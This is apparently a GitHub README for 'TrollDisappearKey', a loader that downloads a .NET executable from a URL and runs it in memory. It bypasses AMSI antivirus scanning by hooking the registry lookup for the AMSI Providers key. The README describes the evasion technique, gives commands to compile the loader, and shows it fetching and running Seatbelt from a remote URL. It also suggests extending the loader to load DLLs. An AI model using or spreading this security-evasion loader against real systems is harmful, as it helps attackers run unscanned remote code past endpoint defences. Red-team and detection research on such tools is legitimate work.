# TrollDisappearKey
TrollDisappear.exe is a loader which allows loading of .exe assemblies (provide URL to assembly) without amsi scanning taking place during assembly.load()

# How does it work?
Upon assembly.load(), internals of amsi/clr will search for reg key "Software\Microsoft\AMSI\Providers" to load the relevant provider dlls (i.e security vendor dlls) 
![Image](https://github.com/user-attachments/assets/f1678081-5fa8-4f4d-b7d3-ae9bd2e02a9f)

We hook the reg query function and when amsi/clr tries to read "Software\Microsoft\AMSI\Providers" we overwrite its value to "Software\Microsoft\AMSI\Providers "  <- note the space after providers
This breaks the provider dlls loading process and we are able to assembly load and .net assembly we want  
![Image](https://github.com/user-attachments/assets/7ef91a6a-957f-4c91-80a2-c0b54409917c)

# What's unique?
concept is hooking / byte patching so nothing much really. 
This works specifically for clr bypass not powershell. It used to work for powershell >1 year ago but something updated and it broke. 
  
## Usage 
```
TrollDisappearKey.exe <URL TO .EXE ASSEMBLY> <ARGUMENT1,ARGUMENT2>
```

## Example
```
c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:TrollDisappearKey.exe TrollDisappearKey.cs
TrollDisappearKey.exe "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Seatbelt.exe" "AMSIProviders"
```

## Features
Nothing actually, its quite barebone with short code profile so anyone can tweak it to their needs  (e.g tweak the code to load .dll assemblies instead of just .exe assemblies)

## Credits
1. Modified hooking library from https://github.com/liulilittle/NetHook

## Disclaimer
Should only be used for educational purposes!
